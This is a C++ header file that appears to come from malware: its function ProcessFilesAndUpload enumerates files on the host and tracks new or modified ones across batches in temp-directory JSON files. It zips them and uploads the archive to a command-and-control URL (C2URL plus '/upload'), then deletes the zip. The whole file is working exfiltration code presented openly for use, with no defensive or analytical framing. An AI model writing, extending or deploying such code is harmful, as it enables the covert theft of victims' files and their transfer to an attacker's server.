#pragma once
#define NOMINMAX

#include <iostream>
#include <fstream>
#include "file_enum.hpp"
#include "json.hpp"

#include "../Communication/senddata.hpp"
#include "helpers.hpp"
#include "zipping.hpp"


void ProcessFilesAndUpload(std::wstring C2URL) {
    std::string tmpDir = TmpPath();

    const std::string configFileName = tmpDir + "config.json";
    int batchId = 1;

    std::map<std::string, std::map<std::string, std::string>> current_results = FileEnum();
    std::map<std::string, std::map<std::string, std::string>> final_results;

    // Check if "config.json" exists
    if (std::filesystem::exists(configFileName)) {
        std::ifstream configFile(configFileName);
        nlohmann::json configData;
        configFile >> configData;

        if (!configData.empty()) {
            batchId = configData.back()["id"].get<int>() + 1;
        }

        for (const auto& [filePath, attributes] : current_results) {
            // First, ensure the file still exists
            if (!std::filesystem::exists(filePath)) {
                continue;
            }

            bool foundInPreviousBatches = false;
            bool foundInLastBatch = false;

            for (const auto& batch : configData) {
                std::string batchFileName = batch["filename"].get<std::string>();
                if (std::filesystem::exists(batchFileName)) {
                    std::ifstream batchFile(batchFileName);
                    nlohmann::json batchData;
                    batchFile >> batchData;
                    batchFile.close();

                    if (batchData.find(filePath) != batchData.end()) {
                        foundInPreviousBatches = true;

                        // Check if it's the last batch
                        if (&batch == &configData.back()) {
                            foundInLastBatch = true;
                            std::string prev_date = batchData[filePath]["date"].get<std::string>();
                            if (prev_date != attributes.at("date")) {
                                final_results[filePath] = attributes;
                            }
                        }
                    }
                }

                if (foundInLastBatch) {
                    break; // No need to check older batches for modifications
                }
            }

            if (!foundInPreviousBatches) {
                final_results[filePath] = attributes;
            }
        }
        configFile.close();
    }
    else {
        final_results = current_results;
    }

    // If no new or modified files found, return early
    if (final_results.empty()) {
        std::cout << "No new or modified file was found" << std::endl;
        return;
    }
    

    std::string batchFileName = tmpDir + "batch_files_" + std::to_string(batchId) + ".json";
    // Convert the final results to JSON format
    nlohmann::json jResults = final_results;

    // Write the final results to the new batch file
    std::ofstream batchFile(batchFileName);
    batchFile << jResults.dump(4);
    batchFile.close();

    // Append the new entry to the config data and save
    nlohmann::json configData;
    if (std::filesystem::exists(configFileName)) {
        std::ifstream configFile(configFileName);
        configFile >> configData;
        configFile.close();
    }
    configData.push_back({
        {"filename", std::filesystem::absolute(batchFileName).string()},
        {"id", batchId}
        });
    std::ofstream configFile(configFileName);
    configFile << configData.dump(4);
    configFile.close();

    // === ZIPPING PROCESS STARTS HERE ===
    std::vector<std::wstring> filesToZip;
    for (const auto& [filePath, attributes] : final_results) {
        filesToZip.push_back(std::wstring(filePath.begin(), filePath.end()));
    }

    // Zip the new files
    
    std::wstring zipDest = std::wstring(tmpDir.begin(), tmpDir.end()) + L"zipped.zip";
    std::string zipDestStr = WStringToString(zipDest);
    int zipResult = ZipFiles(zipDest, filesToZip);
    if (zipResult != ZIP_SUCCESS) {
        std::cerr << "There was an error zipping the files." << std::endl;
    }

    // === UPLOADING PROCESS BEGINS HERE ===
    std::wstring URL = C2URL + L"/upload";
    std::wstring SPEEDTESTURL = C2URL + L"/speedtest";
    UploadFile(URL, zipDestStr, SPEEDTESTURL); // Use the full path to the zip file in the temp directory
    std::this_thread::sleep_for(std::chrono::seconds(5));

    // Delete the zip from the temp directory
    std::filesystem::remove(zipDest);
}

